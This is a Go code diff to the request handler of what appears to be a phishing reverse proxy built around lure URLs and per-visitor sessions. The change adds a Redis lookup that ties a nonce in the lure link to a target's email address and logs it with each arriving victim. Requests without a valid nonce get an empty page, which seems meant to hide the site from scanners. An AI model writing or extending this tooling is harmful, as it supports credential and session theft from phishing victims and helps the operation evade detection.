@@ -318,20 +318,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 
 					if create_session /*&& !p.isWhitelistedIP(remote_addr, pl.Name)*/ { // TODO: always trigger new session when lure URL is detected (do not check for whitelisted IP only after this is done)
-						rdb := redis.NewClient(&redis.Options{
-						        Addr:     "localhost:6379",
-						        Password: "", // no password st
-						        DB:       0,  // use default DB
-						    })
-						if os.Getenv("CHECK_NONCE") != "" {
-							nonce := req.URL.Query().Get("k")
-							log.Info("Nonce: %s",nonce)
-							_, err := rdb.GetDel(ctxbg, nonce).Result()
-							if err == redis.Nil {
-								log.Warning("No matching nonce. Rejecting request")
-								return req, goproxy.NewResponse(req, "text/plain", http.StatusOK, "")
-							}
-						}
 						// session cookie not found
 						if !p.cfg.IsSiteHidden(pl_name) {
 							if l != nil {
@@ -366,11 +352,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 
+								email := ""
+								email_insert := ""
+								if p.cfg.GetRedisEnabled() {
+									rdb := redis.NewClient(&redis.Options{
+									    Addr:     fmt.Sprintf("%s:%d", p.cfg.GetRedisHost(), p.cfg.GetRedisPort()),
+									    Password: p.cfg.GetRedisPassword(),
+									    DB:       p.cfg.GetRedisDB(), 
+									})
+									nonce := req.URL.Query().Get("k")
+									log.Info("Nonce: %s",nonce)
+									email, err = rdb.GetDel(ctxbg, nonce).Result()
+									if err != nil {
+										log.Warning("Redis error %s. Rejecting request", err)
+										return req, goproxy.NewResponse(req, "text/plain", http.StatusOK, "")
+									}
+									email_insert = email + " (Nonce: " + nonce + ") "
+								}
 								session, err := NewSession(pl.Name)
 								if err == nil {
 									sid := p.last_sid
 									p.last_sid += 1
-									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+									log.Important("[%d] [%s] new visitor has arrived: %s%s (%s)", sid, hiblue.Sprint(pl_name), email_insert, req.Header.Get("User-Agent"), remote_addr)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
